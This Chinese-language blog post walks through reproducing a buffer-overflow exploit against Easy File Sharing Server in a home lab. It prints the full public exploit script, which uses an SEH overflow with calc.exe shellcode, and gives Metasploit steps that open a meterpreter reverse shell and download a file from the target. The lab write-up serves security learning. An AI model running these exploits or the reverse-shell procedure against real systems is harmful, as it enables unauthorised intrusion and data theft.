---
title: easy file sharing server漏洞复现
date: 2021-11-03 20:25:24
tags: 漏洞复现
cover: https://raw.githubusercontent.com/todis21/image/main/img/wallhaven-o3jpyp_1920x1080.png
---

# easy file sharing server漏洞复现

## 一、漏洞详情

Easy File Sharing FTP Server是一款FTP服务程序。 Easy File Sharing FTP Server处理PASS命令存在问题，远程攻击者可以利用漏洞进行缓冲区溢出攻击，可能以进程权限执行任意指令。 提交超长字符串作为PASS命令参数，可导致触发缓冲区溢出，精心构建提交数据可能以进程权限执行任意指令。



##  二、工具

靶机： 192.168.118.132、win10（可用其他win系统，把windows安全中心关闭）、安装easy file sharing server

攻击机：192.168.118.128、kali

## 三、开始复现

靶机打开easy file sharing server，把端口改为8000，然后点击restart

![](https://raw.githubusercontent.com/todis21/image/main/img/image-20211103203726819.png)

在kali用nmap扫描

```
nmap -sV 192.168.118.0/24  
```

![image-20211103204514315](https://raw.githubusercontent.com/todis21/image/main/img/image-20211103204514315.png)

可以发现主机192.168.118.132（靶机）已经在8000端口打开了Easy File Sharing 服务



在kali使用searchsploit工具查找相应的渗透模块

[传送门](https://blog.csdn.net/qq_38243607/article/details/107140817)

```
searchsploit easy file sharing
```

![image-20211103211503587](https://raw.githubusercontent.com/todis21/image/main/img/image-20211103211503587.png)

图片中path的，就是示例脚本的路径，完整路径是：/usr/share/exploitdb/exploits/+path中的脚本路径

这里使用39009.py

```
python /usr/share/exploitdb/exploits/windows/remote/39009.py 192.168.118.132 8000
```

复现成功

![](https://raw.githubusercontent.com/todis21/image/main/img/image-20211103213100870.png)

脚本代码

```python
# Exploit Title: Easy File Sharing Web Server 7.2 - HEAD HTTP request SEH Buffer Overflow
# Date: 12/2/2015
# Exploit Author: ArminCyber
# Contact: Armin.Exploit@gmail.com
# Version: 7.2
# Tested on: XP SP3 EN
# category: Remote Exploit
# Usage: ./exploit.py ip port

import socket
import sys

host = str(sys.argv[1])
port = int(sys.argv[2])

a = socket.socket()

print "Connecting to: " + host + ":" + str(port)
a.connect((host,port))

entire=4500

# Junk
buff = "A"*4061

# Next SEH
buff+= "\xeb\x0A\x90\x90"

# pop pop ret
buff+= "\x98\x97\x01\x10"

buff+= "\x90"*19

# calc.exe
# Bad Characters: \x20 \x2f \x5c
shellcode = (
"\xd9\xcb\xbe\xb9\x23\x67\x31\xd9\x74\x24\xf4\x5a\x29\xc9"
"\xb1\x13\x31\x72\x19\x83\xc2\x04\x03\x72\x15\x5b\xd6\x56"
"\xe3\xc9\x71\xfa\x62\x81\xe2\x75\x82\x0b\xb3\xe1\xc0\xd9"
"\x0b\x61\xa0\x11\xe7\x03\x41\x84\x7c\xdb\xd2\xa8\x9a\x97"
"\xba\x68\x10\xfb\x5b\xe8\xad\x70\x7b\x28\xb3\x86\x08\x64"
"\xac\x52\x0e\x8d\xdd\x2d\x3c\x3c\xa0\xfc\xbc\x82\x23\xa8"
"\xd7\x94\x6e\x23\xd9\xe3\x05\xd4\x05\xf2\x1b\xe9\x09\x5a"
"\x1c\x39\xbd"
)
buff+= shellcode

buff+= "\x90"*7

buff+= "A"*(4500-4061-4-4-20-len(shellcode)-20)

# HEAD
a.send("HEAD " + buff + " HTTP/1.0\r\n\r\n")

a.close()

print "Done..."
```







## 另一种“姿势”

利用Metasploit生成主控端和被动端

在kali输入

```
msfconsole
```

开启msf控制台



![image-20211104122617692](https://raw.githubusercontent.com/todis21/image/main/img/image-20211104122617692.png)

寻找EasyFileSharing漏洞利用模块

```
search EasyFileSharing
```



![image-20211104122911066](https://raw.githubusercontent.com/todis21/image/main/img/image-20211104122911066.png)

然后

```
use exploit/windows/http/easyfilesharing_seh
```

提示No payload configured, defaulting to windows/meterpreter/reverse_tcp

```
show options//查看配置
```

![image-20211104123311810](https://raw.githubusercontent.com/todis21/image/main/img/image-20211104123311810.png)

```
set rhost 192.168.118.132
```

输入 

```
exploit
```

模块执行成功，然后你就可以执行任意你想要执行的命令

![image-20211104131046111](https://raw.githubusercontent.com/todis21/image/main/img/image-20211104131046111.png)

在靶机写个字符串保存在flag.txt里，放在C:\EFS Software\Easy File Sharing Web Server下，用于后续辨别

![image-20211104131150479](https://raw.githubusercontent.com/todis21/image/main/img/image-20211104131150479.png)



执行命令ls，可以找到刚刚在靶机写的flag.txt

![image-20211104131253395](https://raw.githubusercontent.com/todis21/image/main/img/image-20211104131253395.png)

把它下载下来

```
download flag.txt
```



![image-20211104131438019](https://raw.githubusercontent.com/todis21/image/main/img/image-20211104131438019.png)



![image-20211104131554985](https://raw.githubusercontent.com/todis21/image/main/img/image-20211104131554985.png)

